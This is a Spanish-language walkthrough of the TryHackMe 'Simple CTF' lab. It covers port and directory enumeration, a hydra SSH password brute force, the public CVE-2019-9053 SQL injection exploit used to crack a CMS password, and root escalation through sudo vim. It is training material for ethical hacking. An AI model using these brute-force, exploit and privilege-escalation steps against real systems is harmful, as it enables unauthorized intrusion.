# Resolución de la Máquina: Simple CTF

- **Plataforma:** TryHackMe
- **Dificultad:** Fácil
- **Fecha de resolución:** 23/06/2025
- **Sistema Operativo:** Linux


## Descripción

Simple CTF es una máquina de nivel fácil alojada en TryHackMe, orientada a usuarios que están comenzando en el mundo del hacking ético y la resolución de CTFs en entornos Linux. A través de su estructura lineal y directa, permite practicar conceptos esenciales de enumeración, explotación básica y escalada de privilegios.

Durante el proceso de resolución, el atacante debe identificar servicios expuestos mediante técnicas de reconocimiento, acceder al sistema aprovechando credenciales débiles o mal protegidas, y finalmente encontrar una ruta sencilla para escalar privilegios y obtener el control total del sistema.

Esta máquina es útil para practicar:

> Enumeración de puertos y servicios con herramientas como nmap

> Fuerza bruta o uso de credenciales simples para acceso inicial

> Revisión de archivos del sistema en busca de información sensible

> Técnicas básicas de escalada de privilegios en sistemas Linux, como el uso de binarios con permisos SUID o mal uso de sudo


## Enumeración

### Escaneo con Nmap

```bash
└─$ nmap --open -T5 -sS -sV -n -Pn 10.10.196.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 15:36 CEST
Nmap scan report for 10.10.196.20
Host is up (0.043s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
```
### Escaneo con gobuster
```bash
└─$ gobuster dir -u http://10.10.196.20 -w /usr/share/wordlists/wfuzz/general/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.196.20
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/wfuzz/general/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.196.20/simple/]
Progress: 952 / 953 (99.90%)
===============================================================
Finished
===============================================================
```
## Intrusión
Podemos conectarnos al FTP como usuario anonymous y en modo passive, encontraremos el sigueinte txt.
```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
Si seguimos buscando por la web veremos que se ha colgado una noticia por el usuario mitch, por lo tanto probaremos a realizar un ataque de fuerza bruta contra este usuario:
```bash
└─$ hydra -V -t 4 -l mitch -P /usr/share/wordlists/rockyou.txt  ssh://10.10.127.116:2222
[2222][ssh] host: 10.10.127.116   login: mitch   password: secret
```
Obtendremos las credenciales con las que accederemos por ssh y con las que podremos acceder al panel de admin de la wev,

No obstante, el sitio web también presenta la siguiente vulnerabilidad: CVE-2019-9053, por lo que descargaremos el exploit desde exploit-db (este vulnera mediante sqli).
Veremos que hemos de retocar la sintaxis de la función print añadiendo parentesis para su correcta interpretación en python3
```bash
┌──(yeray㉿kali)-[~/THM/SimpleCTF]
└─$ sudo python2 46635.py -u http://10.10.118.69/simple --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret                                                                                                                                                                                    
```
Necesitaremos instalar la dependencia de termcolor para su correcta ejecución.

## Escalada de privilegios
Nos conectaremos por ssh a través del puerto 2222 con las credenciales obtenidas e intriduciremos el siguiente comando para generar una shell interactiva
```bash
┌──(yeray㉿kali)-[~/THM/SimpleCTF]
└─$ ssh mitch@10.10.118.69 -p 2222  
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
mitch@Machine:~$
```
Veremos que podemos escalar privilegios gracias al permiso de sudo que tenemos sobre vim, si buscamos en GTFOBins veremos como podemos escalar privilegios.
```bash
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:~$ sudo vim -c ':!/bin/sh'

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@Machine:~# whoami
root

```
